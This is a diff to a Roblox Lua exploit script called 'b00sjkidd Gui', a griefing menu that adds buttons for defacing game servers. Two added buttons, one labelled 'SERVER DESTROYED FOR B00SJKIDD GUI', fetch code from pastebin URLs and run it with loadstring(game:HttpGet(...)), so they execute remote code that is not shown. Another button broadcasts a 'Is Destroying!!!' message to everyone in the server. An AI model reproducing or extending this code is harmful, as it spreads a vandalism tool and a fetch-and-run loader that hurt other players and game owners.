@@ -9,9 +9,13 @@ local Credits = Instance.new("TextButton")
 local Name = Instance.new("TextLabel")
 local AR = Instance.new("TextButton")
 local DS = Instance.new("TextButton")
+local ARS = Instance.new("TextButton")
+local DSS = Instance.new("TextButton")
 local e1x1x1x1Laugh = Instance.new("TextButton")
 local DayToNight = Instance.new("TextButton")
+local DayToNights = Instance.new("TextButton")
 local e666 = Instance.new("TextButton")
+local a666 = Instance.new("TextButton")
 local EpicSaxGuy = Instance.new("TextButton")
 local Disc0 = Instance.new("TextButton")
 local e2006Theme = Instance.new("TextButton")
@@ -57,7 +61,7 @@ Name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 Name.BackgroundTransparency = 1.000
 Name.Size = UDim2.new(0, 378, 0, 25)
 Name.Font = Enum.Font.GothamBold
-Name.Text = "b00sjkidd Gui  .👑.  UPD 2.65_x"
+Name.Text = "b00sjkidd Gui 👑 2.66_x"
 Name.TextColor3 = Color3.fromRGB(0, 0, 0)
 Name.TextScaled = true
 Name.TextSize = 14.000
@@ -112,6 +116,41 @@ DS.MouseButton1Down:connect(function()
                 s.SkyboxUp = "http://www.roblox.com/Asset/?id=15396294306"
                 s.Parent = game.Lighting
 		
+end)
+ARS.Name = "autoreport"
+ARS.Parent = Frame
+ARS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+ARS.Visible = false
+ARS.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
+ARS.Size = UDim2.new(0, 79, 0, 31)
+ARS.Font = Enum.Font.GothamBold
+ARS.Text = "MSG"
+ARS.TextColor3 = Color3.fromRGB(0, 0, 0)
+ARS.TextScaled = true
+ARS.TextSize = 14.000
+ARS.TextWrapped = true
+ARS.MouseButton1Down:connect(function()
+
+local msg = Instance.new("Message",workspace)
+		msg.Text = "TEAM JKLO,JO1TAR0,K00PZKIDD Is Destroying!!!"
+		wait(3)
+		msg:Destroy()
+end)
+DSS.Name = "decalspam"
+DSS.Parent = Frame
+DSS.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+DSS.Visible = false
+DSS.Position = UDim2.new(0.0714285746, 0, 0.436000019, 0)
+DSS.Size = UDim2.new(0, 79, 0, 31)
+DSS.Font = Enum.Font.GothamBold
+DSS.Text = "SERVER DESTROYED FOR B00SJKIDD GUI"
+DSS.TextColor3 = Color3.fromRGB(0, 0, 0)
+DSS.TextScaled = true
+DSS.TextSize = 14.000
+DSS.TextWrapped = true
+DSS.MouseButton1Down:connect(function()
+--Made by JO1TAR0
+loadstring(game:HttpGet('https://pastebin.com/raw/JaVBANmT'))()
 end)
 e1x1x1x1Laugh.Name = "e1x1x1x1Laugh"
 e1x1x1x1Laugh.Parent = Frame
@@ -381,23 +420,77 @@ end
 		wait(0.5)
 	end
 end)
+DayToNights.Name = "DayToNight"
+DayToNights.Parent = Frame
+DayToNights.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+DayToNights.Visible = false
+DayToNights.Position = UDim2.new(0.388888896, 0, 0.216000006, 0)
+DayToNights.Size = UDim2.new(0, 83, 0, 31)
+DayToNights.Font = Enum.Font.GothamBold
+DayToNights.Text = "STICKLE"
+DayToNights.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayToNights.TextScaled = true
+DayToNights.TextSize = 14.000
+DayToNights.TextWrapped = true
+DayToNights.MouseButton1Down:connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/AZVi2tuK"))()
+end)
 e666.Name = "e666"
 e666.Parent = Frame
-e666.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
+e666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 e666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
 e666.Size = UDim2.new(0, 83, 0, 31)
 e666.Font = Enum.Font.GothamBold
-e666.Text = "MSG"
+e666.Text = "NEXT"
 e666.TextColor3 = Color3.fromRGB(0, 0, 0)
 e666.TextScaled = true
 e666.TextSize = 14.000
 e666.TextWrapped = true
 e666.MouseButton1Down:connect(function()
-
-	local msg = Instance.new("Message",workspace)
-		msg.Text = "TEAM JKLO,JO1TAR0,K00PZKIDD Is Destroying!!!"
-		wait(3)
-		msg:Destroy()
+wait(0.2)
+DSS.Visible = true
+ARS.Visible = true
+a666.Visible = true
+DayToNights.Visible = true
+DayToNight.Visible = false
+e1x1x1x1Laugh.Visible = false
+DS.Visible = false
+AR.Visible = false
+ForceField.Visible = false
+e2006Theme.Visible = false
+Disc0.Visible = false
+EpicSaxGuy.Visible = false
+e666.Visible = false
+wait(0.2)
+end)
+a666.Name = "e666"
+a666.Parent = Frame
+a666.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+a666.Visible = false
+a666.Position = UDim2.new(0.388888896, 0, 0.43599999, 0)
+a666.Size = UDim2.new(0, 83, 0, 31)
+a666.Font = Enum.Font.GothamBold
+a666.Text = "NEXT"
+a666.TextColor3 = Color3.fromRGB(0, 0, 0)
+a666.TextScaled = true
+a666.TextSize = 14.000
+a666.TextWrapped = true
+a666.MouseButton1Down:connect(function()
+wait(0.2)
+DSS.Visible = false
+ARS.Visible = false
+a666.Visible = false
+DayToNights.Visible = false
+DayToNight.Visible = true
+e1x1x1x1Laugh.Visible = true
+DS.Visible = true
+AR.Visible = true
+ForceField.Visible = true
+e2006Theme.Visible = true
+Disc0.Visible = true
+EpicSaxGuy.Visible = true
+e666.Visible = true
+wait(0.2)
 end)
 EpicSaxGuy.Name = "EpicSaxGuy"
 EpicSaxGuy.Parent = Frame
